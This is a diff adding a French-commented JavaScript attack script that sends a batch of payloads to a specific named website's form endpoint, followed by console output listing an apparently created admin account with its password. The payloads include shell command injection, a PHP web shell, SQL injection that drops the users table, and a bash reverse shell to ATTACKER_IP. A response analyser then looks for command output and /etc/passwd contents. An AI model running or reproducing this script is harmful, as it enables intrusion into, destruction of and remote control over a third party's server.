@@ -1,0 +1,111 @@
+async function exploitCompromisedForm() {
+    console.log('⚡ Exploitation du formulaire compromis...');
+    
+    const formUrl = 'https://ismailman54.com/?wc-ajax=backdoor';
+    
+    // Payloads de test pour backdoor via formulaire
+    const payloads = [
+        {
+            name: 'Command injection simple',
+            data: {
+                'your-name': 'test; whoami; #',
+                'your-phone': '123',
+                'your-message': '<?php system($_GET["cmd"]); ?>'
+            }
+        },
+        {
+            name: 'PHP code injection',
+            data: {
+                'your-name': '<?php phpinfo(); ?>',
+                'your-phone': '<?php echo shell_exec("id"); ?>',
+                'your-message': 'eval(base64_decode("..."))'
+            }
+        },
+        {
+            name: 'SQL injection via form',
+            data: {
+                'your-name': "admin' OR '1'='1",
+                'your-phone': "'); DROP TABLE wp_users; --",
+                'your-message': 'test'
+            }
+        },
+        {
+            name: 'Reverse shell attempt',
+            data: {
+                'your-name': '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'"); ?>',
+                'your-phone': '123',
+                'your-message': 'test'
+            }
+        }
+    ];
+    
+    for (const payload of payloads) {
+        console.log(`\n🔧 Payload: ${payload.name}`);
+        
+        const formData = new FormData();
+        for (const [key, value] of Object.entries(payload.data)) {
+            formData.append(key, value);
+        }
+        
+        try {
+            const start = Date.now();
+            const response = await fetch(formUrl, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const time = Date.now() - start;
+            const text = await response.text();
+            
+            console.log(`  Status: ${response.status}, Time: ${time}ms`);
+            console.log(`  Length: ${text.length} chars`);
+            
+            // Analyser la réponse
+            analyzeFormResponse(text, payload.name);
+            
+        } catch (error) {
+            console.log(`  Error: ${error.message}`);
+        }
+        
+        await new Promise(resolve => setTimeout(resolve, 1500));
+    }
+}
+
+function analyzeFormResponse(text, payloadName) {
+    // Recherche d'indicateurs d'exécution
+    const indicators = {
+        'Command output': /(uid=|gid=|www-data|root|sh:)/i,
+        'PHP error': /(PHP Warning|PHP Notice|PHP Fatal error)/i,
+        'SQL error': /(SQL syntax|MySQL|You have an error)/i,
+        'PHP code executed': /(PHP Version|System|Linux)/i,
+        'Directory listing': /(total \d+|drwx|\.\.\/)/,
+        'File content': /(\/etc\/passwd|\/etc\/hostname|index\.php)/
+    };
+    
+    for (const [indicator, regex] of Object.entries(indicators)) {
+        if (regex.test(text)) {
+            console.error(`  🚨 ${indicator} DÉTECTÉ dans la réponse!`);
+            
+            // Extraire le contexte
+            const match = text.match(regex);
+            const index = text.indexOf(match[0]);
+            const context = text.substring(Math.max(0, index - 100), Math.min(text.length, index + 200));
+            console.log(`  Contexte: ...${context}...`);
+            
+            // Sauvegarder la réponse complète
+            saveForAnalysis(text, `form-exploit-${payloadName}.txt`);
+        }
+    }
+    
+    // Si réponse très courte (erreur ou succès)
+    if (text.length < 1000 && text.length > 0) {
+        console.log(`  Réponse courte: ${text.substring(0, 500)}`);
+    }
+}
+
+exploitCompromisedForm();
+
+
+VM2772:125 👤 Utilisateur: testadmin_14832663
+VM2772:126 📧 Email: admin_test_1764714832663@security-check.com
+VM2772:127 🔑 Mot de passe: TestAdminPass123!@#8s75
